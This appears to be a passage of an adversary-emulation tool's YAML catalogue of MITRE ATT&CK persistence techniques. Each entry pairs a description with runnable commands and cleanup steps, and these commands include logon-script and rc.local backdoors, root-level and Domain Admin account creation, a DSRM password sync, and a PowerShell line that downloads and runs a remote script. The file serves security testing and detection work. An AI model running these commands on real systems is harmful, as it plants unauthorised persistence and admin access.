# AutoStrike MITRE ATT&CK Techniques - persistence
# Auto-generated by mitre-import script
# Source: MITRE ATT&CK STIX 2.1 + Atomic Red Team

- id: T1037.001
  name: Logon Script (Windows)
  description: |-
    Adversaries may use Windows logon scripts automatically executed at logon initialization to establish persistence. Windows allows logon scripts to be run whenever a specific user or group of users log into a system.(Citation: TechNet Logon Scripts) This is done via adding a path to a script to the <code>HKCU\Environment\UserInitMprLogonScript</code> Registry key.(Citation: Hexacorn Logon Scripts)

    Adversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
  platforms:
    - windows
  executors:
    - name: Logon Scripts
      type: cmd
      platform: windows
      command: |-
        echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
        REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%temp%\art.bat" /f
      cleanup: |-
        REG.exe DELETE HKCU\Environment /v UserInitMprLogonScript /f >nul 2>&1
        del %temp%\art.bat >nul 2>&1
        del "%USERPROFILE%\desktop\T1037.001-log.txt" >nul 2>&1
      timeout: 120
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1037/001
  is_safe: true
- id: T1037.004
  name: RC Scripts
  description: |-
    Adversaries may establish persistence by modifying RC scripts, which are executed during a Unix-like system’s startup. These files allow system administrators to map and start custom services at startup for different run levels. RC scripts require root privileges to modify.

    Adversaries may establish persistence by adding a malicious binary path or shell commands to <code>rc.local</code>, <code>rc.common</code>, and other RC scripts specific to the Unix-like distribution.(Citation: IranThreats Kittens Dec 2017)(Citation: Intezer HiddenWasp Map 2019) Upon reboot, the system executes the script's contents as root, resulting in persistence.

    Adversary abuse of RC scripts is especially effective for lightweight Unix-like distributions using the root user as default, such as ESXi hypervisors, IoT, or embedded systems.(Citation: intezer-kaiji-malware) As ESXi servers store most system files in memory and therefore discard changes on shutdown, leveraging `/etc/rc.local.d/local.sh` is one of the few mechanisms for enabling persistence across reboots.(Citation: Juniper Networks ESXi Backdoor 2022)

    Several Unix-like systems have moved to Systemd and deprecated the use of RC scripts. This is now a deprecated mechanism in macOS in favor of Launchd.(Citation: Apple Developer Doco Archive Launchd)(Citation: Startup Items) This technique can be used on Mac OS X Panther v10.3 and earlier versions which still execute the RC scripts.(Citation: Methods of Mac Malware Persistence) To maintain backwards compatibility some systems, such as Ubuntu, will execute the RC scripts if they exist with the correct file permissions.(Citation: Ubuntu Manpage systemd rc)
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
  platforms:
    - macos
    - linux
  executors:
    - name: rc.common
      type: bash
      platform: macos
      command: sudo echo osascript -e 'tell app "Finder" to display dialog "Hello World"' >> /etc/rc.common
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: rc.common (2)
      type: bash
      platform: linux
      command: |-
        filename='/etc/rc.common';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.common.original;fi
        printf '%s\n' '#!/bin/bash' | sudo tee /etc/rc.common
        echo "python3 -c \"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMuY29tbW9uID4gL3RtcC9UMTAzNy4wMDQucmMuY29tbW9uJykK'))\"" | sudo tee -a /etc/rc.common
        printf '%s\n' 'exit 0' | sudo tee -a /etc/rc.common
        sudo chmod +x /etc/rc.common
      cleanup: origfilename='/etc/rc.common.original';if [ ! -f $origfilename ];then sudo rm /etc/rc.common;else sudo cp $origfilename /etc/rc.common && sudo rm $origfilename;fi
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: rc.local
      type: sh
      platform: linux
      command: |-
        filename='/etc/rc.local';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.local.original;fi
        [ "$(uname)" = 'FreeBSD' ] && alias python3=python3.9 && printf '#\!/usr/local/bin/bash' | sudo tee /etc/rc.local || printf '#!/bin/bash' | sudo tee /etc/rc.local
        echo "\npython3 -c \"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMubG9jYWwgPiAvdG1wL1QxMDM3LjAwNC5yYy5sb2NhbCcpCgo='))\"" | sudo tee -a /etc/rc.local
        printf 'exit 0' | sudo tee -a /etc/rc.local
        sudo chmod +x /etc/rc.local
      cleanup: origfilename='/etc/rc.local.original';if [ ! -f $origfilename ];then sudo rm /etc/rc.local;else sudo cp $origfilename /etc/rc.local && sudo rm $origfilename;fi
      timeout: 60
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1037/004
  is_safe: false
- id: T1037.005
  name: Startup Items
  description: "Adversaries may use startup items automatically executed at boot initialization to establish persistence. Startup items execute during the final phase of the boot process and contain shell scripts or other executable files along with configuration information used by the system to determine the execution order for all startup items.(Citation: Startup Items)\n\nThis is technically a deprecated technology (superseded by [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)), and thus the appropriate folder, <code>/Library/StartupItems</code> isn’t guaranteed to exist on the system by default, but does appear to exist by default on macOS Sierra. A startup item is a directory whose executable and configuration property list (plist), <code>StartupParameters.plist</code>, reside in the top-level directory. \n\nAn adversary can create the appropriate folders/files in the StartupItems directory to register their own persistence mechanism.(Citation: Methods of Mac Malware Persistence) Additionally, since StartupItems run during the bootup phase of macOS, they will run as the elevated root user."
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
  platforms:
    - macos
  executors:
    - name: Add file to Local Library StartupItems
      type: sh
      platform: macos
      command: sudo touch /Library/StartupItems/EvilStartup.plist
      cleanup: sudo rm /Library/StartupItems/EvilStartup.plist
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Add launch script to launch daemon
      type: bash
      platform: macos
      command: |-
        sudo cp $PathToAtomicsFolder/T1037.005/src/StartupParameters.plist /Library/StartupItems/StartupParameters.plist
        sudo cp $PathToAtomicsFolder/T1037.005/src/T1037.005_daemon.sh /Library/StartupItems/atomic.sh
        sudo cp $PathToAtomicsFolder/T1037.005/src/T1037_005_daemon.plist /tmp/T1037_005_daemon.plist
        sudo /Library/StartupItems/atomic.sh start
      cleanup: |-
        sudo launchctl unload /tmp/T1037_005_daemon.plist
        sudo rm /tmp/T1037_005_daemon.plist
        sudo rm /Library/StartupItems/atomic.sh
        sudo rm /Library/StartupItems/StartupParameters.plist
        sudo rm /tmp/T1037_005_daemon.txt
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Add launch script to launch agent
      type: bash
      platform: macos
      command: |-
        sudo cp $PathToAtomicsFolder/T1037.005/src/StartupParameters.plist /Library/StartupItems/StartupParameters.plist
        sudo cp $PathToAtomicsFolder/T1037.005/src/T1037.005_agent.sh /Library/StartupItems/atomic.sh
        sudo cp $PathToAtomicsFolder/T1037.005/src/T1037_005_agent.plist /tmp/T1037_005_agent.plist
        /Library/StartupItems/atomic.sh start
      cleanup: |-
        sudo launchctl unload /tmp/T1037_005_agent.plist
        sudo rm /tmp/T1037_005_agent.plist
        sudo rm /Library/StartupItems/atomic.sh
        sudo rm /Library/StartupItems/StartupParameters.plist
        sudo rm /tmp/T1037_005_agent.txt
      timeout: 60
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1037/005
  is_safe: false
- id: T1098
  name: Account Manipulation
  description: "Adversaries may manipulate accounts to maintain and/or elevate access to victim systems. Account manipulation may consist of any action that preserves or modifies adversary access to a compromised account, such as modifying credentials or permission groups.(Citation: FireEye SMOKEDHAM June 2021) These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials. \n\nIn order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain. However, account manipulation may also lead to privilege escalation where modifications grant access to additional roles, permissions, or higher-privileged [Valid Accounts](https://attack.mitre.org/techniques/T1078)."
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Admin Account Manipulate
      type: powershell
      platform: windows
      command: |-
        $x = Get-Random -Minimum 2 -Maximum 9999
        $y = Get-Random -Minimum 2 -Maximum 9999
        $z = Get-Random -Minimum 2 -Maximum 9999
        $w = Get-Random -Minimum 2 -Maximum 9999
        Write-Host HaHa_$x$y$z

        $fmm = Get-LocalGroupMember -Group Administrators |?{ $_.ObjectClass -match "User" -and $_.PrincipalSource -match "Local"} | Select Name

        foreach($member in $fmm) {
            if($member -like "*Administrator*") {
                $account = $member.Name.Split("\")[-1] # strip computername\
                $originalDescription = (Get-LocalUser -Name $account).Description
                Set-LocalUser -Name $account -Description "atr:$account;$originalDescription".Substring(0,48) # Keep original name in description
                Rename-LocalUser -Name $account -NewName "HaHa_$x$y$z" # Required due to length limitation
                Write-Host "Successfully Renamed $account Account on " $Env:COMPUTERNAME
                }
            }
      cleanup: |-
        $list = Get-LocalUser |?{$_.Description -like "atr:*"}
        foreach($u in $list) {
          $u.Description -match "atr:(?<Name>[^;]+);(?<Description>.*)"
          Set-LocalUser -Name $u.Name -Description $Matches.Description
          Rename-LocalUser -Name $u.Name -NewName $Matches.Name
          Write-Host "Successfully Reverted Account $($u.Name) to $($Matches.Name) on " $Env:COMPUTERNAME
        }
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Domain Account and Group Manipulate
      type: powershell
      platform: windows
      command: "$x = Get-Random -Minimum 2 -Maximum 99\n$y = Get-Random -Minimum 2 -Maximum 99\n$z = Get-Random -Minimum 2 -Maximum 99\n$w = Get-Random -Minimum 2 -Maximum 99\n\nImport-Module ActiveDirectory\n$account = \"atr--$x$y$z\"\nNew-ADUser -Name $account -GivenName \"Test\" -DisplayName $account -SamAccountName $account -Surname $account -Enabled:$False \nAdd-ADGroupMember \"Domain Admins\" $account"
      cleanup: Get-ADUser -LDAPFilter "(&(samaccountname=atr--*)(givenName=Test))" | Remove-ADUser -Confirm:$False
      timeout: 120
      is_safe: true
    - name: Password Change on Directory Service Restore Mode (DSRM) Account
      type: cmd
      platform: windows
      command: ntdsutil "set dsrm password" "sync from domain account %username%" "q" "q"
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: 'Domain Password Policy Check: Short Password'
      type: powershell
      platform: windows
      command: "$credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"\nif (Test-Path $credFile) {\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n    if($cred.GetNetworkCredential().Password -eq \"Uplow-1\"){\n      Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n    }\n    try {\n        $newPassword = ConvertTo-SecureString Uplow-1 -AsPlainText -Force\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n    }\n    catch { \n        $_.Exception\n        $errCode = $_.Exception.ErrorCode\n        Write-Host \"Error code: $errCode\"\n        if ($errCode -eq 86) {\n            Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n            Remove-Item $credFile\n        }\n        exit $errCode\n    }\n    Write-Host -ForegroundColor Cyan \"Successfully changed the password to Uplow-1\"\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"Uplow-1\" -AsPlainText -Force))\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n    Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"\n}"
      timeout: 120
      is_safe: true
    - name: 'Domain Password Policy Check: No Number in Password'
      type: powershell
      platform: windows
      command: "$credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"\nif (Test-Path $credFile) {\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n    if($cred.GetNetworkCredential().Password -eq \"UpperLowerLong-special\"){\n      Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n    }\n    try {\n        $newPassword = ConvertTo-SecureString UpperLowerLong-special -AsPlainText -Force\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n    }\n    catch { \n        $_.Exception\n        $errCode = $_.Exception.ErrorCode\n        Write-Host \"Error code: $errCode\"\n        if ($errCode -eq 86) {\n            Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n            Remove-Item $credFile\n        }\n        exit $errCode\n    }\n    Write-Host -ForegroundColor Cyan \"Successfully changed the password to UpperLowerLong-special\"\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"UpperLowerLong-special\" -AsPlainText -Force))\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n    Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"\n}"
      timeout: 120
      is_safe: true
    - name: 'Domain Password Policy Check: No Special Character in Password'
      type: powershell
      platform: windows
      command: "$credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"\nif (Test-Path $credFile) {\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n    if($cred.GetNetworkCredential().Password -eq \"UpperLowerLong333noSpecialChar\"){\n      Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n    }\n    try {\n        $newPassword = ConvertTo-SecureString UpperLowerLong333noSpecialChar -AsPlainText -Force\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n    }\n    catch { \n        $_.Exception\n        $errCode = $_.Exception.ErrorCode\n        Write-Host \"Error code: $errCode\"\n        if ($errCode -eq 86) {\n            Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n            Remove-Item $credFile\n        }\n        exit $errCode\n    }\n    Write-Host -ForegroundColor Cyan \"Successfully changed the password to UpperLowerLong333noSpecialChar\"\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"UpperLowerLong333noSpecialChar\" -AsPlainText -Force))\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n    Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"\n}"
      timeout: 120
      is_safe: true
    - name: 'Domain Password Policy Check: No Uppercase Character in Password'
      type: powershell
      platform: windows
      command: "$credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"\nif (Test-Path $credFile) {\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n    if($cred.GetNetworkCredential().Password -eq \"lower-long-special-333\"){\n      Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n    }\n    try {\n        $newPassword = ConvertTo-SecureString lower-long-special-333 -AsPlainText -Force\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n    }\n    catch { \n        $_.Exception\n        $errCode = $_.Exception.ErrorCode\n        Write-Host \"Error code: $errCode\"\n        if ($errCode -eq 86) {\n            Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n            Remove-Item $credFile\n        }\n        exit $errCode\n    }\n    Write-Host -ForegroundColor Cyan \"Successfully changed the password to lower-long-special-333\"\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"lower-long-special-333\" -AsPlainText -Force))\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n    Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"\n}"
      timeout: 120
      is_safe: true
    - name: 'Domain Password Policy Check: No Lowercase Character in Password'
      type: powershell
      platform: windows
      command: "$credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"\nif (Test-Path $credFile) {\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n    if($cred.GetNetworkCredential().Password -eq \"UPPER-LONG-SPECIAL-333\"){\n      Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n    }\n    try {\n        $newPassword = ConvertTo-SecureString UPPER-LONG-SPECIAL-333 -AsPlainText -Force\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n    }\n    catch { \n        $_.Exception\n        $errCode = $_.Exception.ErrorCode\n        Write-Host \"Error code: $errCode\"\n        if ($errCode -eq 86) {\n            Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n            Remove-Item $credFile\n        }\n        exit $errCode\n    }\n    Write-Host -ForegroundColor Cyan \"Successfully changed the password to UPPER-LONG-SPECIAL-333\"\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"UPPER-LONG-SPECIAL-333\" -AsPlainText -Force))\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n    Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"\n}"
      timeout: 120
      is_safe: true
    - name: 'Domain Password Policy Check: Only Two Character Classes'
      type: powershell
      platform: windows
      command: "$credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"\nif (Test-Path $credFile) {\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n    if($cred.GetNetworkCredential().Password -eq \"onlyUPandLowChars\"){\n      Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n    }\n    try {\n        $newPassword = ConvertTo-SecureString onlyUPandLowChars -AsPlainText -Force\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n    }\n    catch { \n        $_.Exception\n        $errCode = $_.Exception.ErrorCode\n        Write-Host \"Error code: $errCode\"\n        if ($errCode -eq 86) {\n            Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n            Remove-Item $credFile\n        }\n        exit $errCode\n    }\n    Write-Host -ForegroundColor Cyan \"Successfully changed the password to onlyUPandLowChars\"\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"onlyUPandLowChars\" -AsPlainText -Force))\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n    Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"\n}"
      timeout: 120
      is_safe: true
    - name: 'Domain Password Policy Check: Common Password Use'
      type: powershell
      platform: windows
      command: "$credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"\nif (Test-Path $credFile) {\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n    if($cred.GetNetworkCredential().Password -eq \"Spring$((Get-Date).Year)!\"){\n      Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n    }\n    try {\n        $newPassword = ConvertTo-SecureString Spring$((Get-Date).Year)! -AsPlainText -Force\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n    }\n    catch { \n        $_.Exception\n        $errCode = $_.Exception.ErrorCode\n        Write-Host \"Error code: $errCode\"\n        if ($errCode -eq 86) {\n            Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n            Remove-Item $credFile\n        }\n        exit $errCode\n    }\n    Write-Host -ForegroundColor Cyan \"Successfully changed the password to Spring$((Get-Date).Year)!\"\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"Spring$((Get-Date).Year)!\" -AsPlainText -Force))\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n    Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"\n}"
      timeout: 120
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1098
  is_safe: true
- id: T1098.004
  name: SSH Authorized Keys
  description: |-
    Adversaries may modify the SSH <code>authorized_keys</code> file to maintain persistence on a victim host. Linux distributions, macOS, and ESXi hypervisors commonly use key-based authentication to secure the authentication process of SSH sessions for remote management. The <code>authorized_keys</code> file in SSH specifies the SSH keys that can be used for logging into the user account for which the file is configured. This file is usually found in the user's home directory under <code>&lt;user-home&gt;/.ssh/authorized_keys</code> (or, on ESXi, `/etc/ssh/keys-<username>/authorized_keys`).(Citation: SSH Authorized Keys) Users may edit the system’s SSH config file to modify the directives `PubkeyAuthentication` and `RSAAuthentication` to the value `yes` to ensure public key and RSA authentication are enabled, as well as modify the directive `PermitRootLogin` to the value `yes` to enable root authentication via SSH.(Citation: Broadcom ESXi SSH) The SSH config file is usually located under <code>/etc/ssh/sshd_config</code>.

    Adversaries may modify SSH <code>authorized_keys</code> files directly with scripts or shell commands to add their own adversary-supplied public keys. In cloud environments, adversaries may be able to modify the SSH authorized_keys file of a particular virtual machine via the command line interface or rest API. For example, by using the Google Cloud CLI’s “add-metadata” command an adversary may add SSH keys to a user account.(Citation: Google Cloud Add Metadata)(Citation: Google Cloud Privilege Escalation) Similarly, in Azure, an adversary may update the authorized_keys file of a virtual machine via a PATCH request to the API.(Citation: Azure Update Virtual Machines) This ensures that an adversary possessing the corresponding private key may log in as an existing user via SSH.(Citation: Venafi SSH Key Abuse)(Citation: Cybereason Linux Exim Worm) It may also lead to privilege escalation where the virtual machine or instance has distinct permi...
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
  platforms:
    - linux
    - macos
  executors:
    - name: Modify SSH Authorized Keys
      type: sh
      platform: linux
      command: if [ -f ~/.ssh/authorized_keys ]; then ssh_authorized_keys=$(cat ~/.ssh/authorized_keys); echo "$ssh_authorized_keys" > ~/.ssh/authorized_keys; fi;
      cleanup: unset ssh_authorized_keys
      timeout: 60
      is_safe: true
    - name: Modify SSH Authorized Keys
      type: sh
      platform: macos
      command: if [ -f ~/.ssh/authorized_keys ]; then ssh_authorized_keys=$(cat ~/.ssh/authorized_keys); echo "$ssh_authorized_keys" > ~/.ssh/authorized_keys; fi;
      cleanup: unset ssh_authorized_keys
      timeout: 60
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1098/004
  is_safe: true
- id: T1133
  name: External Remote Services
  description: |-
    Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)

    Access to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.

    Access may also be gained through an exposed service that doesn’t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)

    Adversaries may also establish persistence on network by configuring a Tor hidden service on a compromised system. Adversaries may utilize the tool `ShadowLink` to facilitate the installation and configuration of the Tor hidden service. Tor hidden service is then accessible via the Tor network because `ShadowLink` sets up a .onion address on the compromised system. `ShadowLink` may be used to forward any inbound connections to RDP, allowing the adversaries to have remote access.(Citation: The BadPilot campaign) Adversaries may get `ShadowLink` to persist on a system by masquerading it as an MS Defender application.(Citation: Russian threat actors dig...
  tactic: persistence
  tactics:
    - persistence
    - initial-access
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Running Chrome VPN Extensions via the Registry 2 vpn extension
      type: powershell
      platform: windows
      command: |-
        $extList = "fcfhplploccackoneaefokcmbjfbkenj", "fdcgdnkidjaadafnichfpabhfomcebme"

        foreach ($extension in $extList) {
          New-Item -Path HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension -Force
          New-ItemProperty -Path "HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension" -Name "update_url" -Value "https://clients2.google.com/service/update2/crx" -PropertyType "String" -Force}
        Start chrome
        Start-Sleep -Seconds 30
        Stop-Process -Name "chrome"
      cleanup: |-
        $extList = "fcfhplploccackoneaefokcmbjfbkenj", "fdcgdnkidjaadafnichfpabhfomcebme"

        foreach ($extension in $extList) {
        Remove-Item -Path "HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension" -ErrorAction Ignore}
      timeout: 120
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1133
  is_safe: false
- id: T1136.001
  name: Local Account
  description: "Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. \n\nFor example, with a sufficient level of access, the Windows <code>net user /add</code> command can be used to create a local account.  In Linux, the `useradd` command can be used, while on macOS systems, the <code>dscl -create</code> command can be used. Local accounts may also be added to network devices, often via common [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as <code>username</code>, to ESXi servers via `esxcli system account add`, or to Kubernetes clusters using the `kubectl` utility.(Citation: cisco_username_cmd)(Citation: Kubernetes Service Accounts Security)\n\nAdversaries may also create new local accounts on network firewall management consoles – for example, by exploiting a vulnerable firewall management system, threat actors may be able to establish super-admin accounts that could be used to modify firewall rules and gain further access to the network.(Citation: Cyber Security News)\n\nSuch accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system."
  tactic: persistence
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Create a user account on a Linux system
      type: bash
      platform: linux
      command: useradd -M -N -r -s /bin/bash -c evil_account evil_user
      cleanup: userdel evil_user
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Create a user account on a FreeBSD system
      type: sh
      platform: linux
      command: pw useradd evil_user -s /usr/sbin/nologin -d /nonexistent -c evil_account
      cleanup: rmuser -y evil_user
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Create a user account on a MacOS system
      type: bash
      platform: macos
      command: |-
        dscl . -create /Users/evil_user
        dscl . -create /Users/evil_user UserShell /bin/zsh
        dscl . -create /Users/evil_user RealName "Evil Account"
        dscl . -create /Users/evil_user UniqueID "1010"
        dscl . -create /Users/evil_user PrimaryGroupID 80
        dscl . -create /Users/evil_user NFSHomeDirectory /Users/evil_user
      cleanup: dscl . -delete /Users/evil_user
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Create a new user in a command prompt
      type: cmd
      platform: windows
      command: net user /add "T1136.001_CMD" "T1136.001_CMD!"
      cleanup: net user /del "T1136.001_CMD" >nul 2>&1
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Create a new user in PowerShell
      type: powershell
      platform: windows
      command: New-LocalUser -Name "T1136.001_PowerShell" -NoPassword
      cleanup: Remove-LocalUser -Name "T1136.001_PowerShell" -ErrorAction Ignore
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Create a new user in Linux with `root` UID and GID.
      type: bash
      platform: linux
      command: |-
        useradd -g 0 -M -d /root -s /bin/bash butter
        if [ $(cat /etc/os-release | grep -i 'Name="ubuntu"') ]; then echo "butter:BetterWithButter" | sudo chpasswd; else echo "BetterWithButter" | passwd --stdin butter; fi;
      cleanup: userdel butter
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Create a new user in FreeBSD with `root` GID.
      type: sh
      platform: linux
      command: |-
        pw useradd butter -g 0 -d /root -s /bin/sh
        echo "BetterWithButter" | pw usermod butter -h 0
      cleanup: pw userdel butter
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Create a new Windows admin user
      type: cmd
      platform: windows
      command: |-
        net user /add "T1136.001_Admin" "T1136_pass"
        net localgroup administrators "T1136.001_Admin" /add
      cleanup: net user /del "T1136.001_Admin" >nul 2>&1
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Create a new Windows admin user via .NET
      type: powershell
      platform: windows
      command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/0xv1n/dotnetfun/9b3b0d11d1c156909c0b1823cff3004f80b89b1f/Persistence/CreateNewLocalAdmin_ART.ps1')
      timeout: 120
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1136/001
  is_safe: false
- id: T1136.002
  name: Domain Account
  description: |-
    Adversaries may create a domain account to maintain access to victim systems. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover user, administrator, and service accounts. With a sufficient level of access, the <code>net user /add /domain</code> command can be used to create a domain account.(Citation: Savill 1999)

    Such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.
  tactic: persistence
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Create a new Windows domain admin user
      type: cmd
      platform: windows
      command: |-
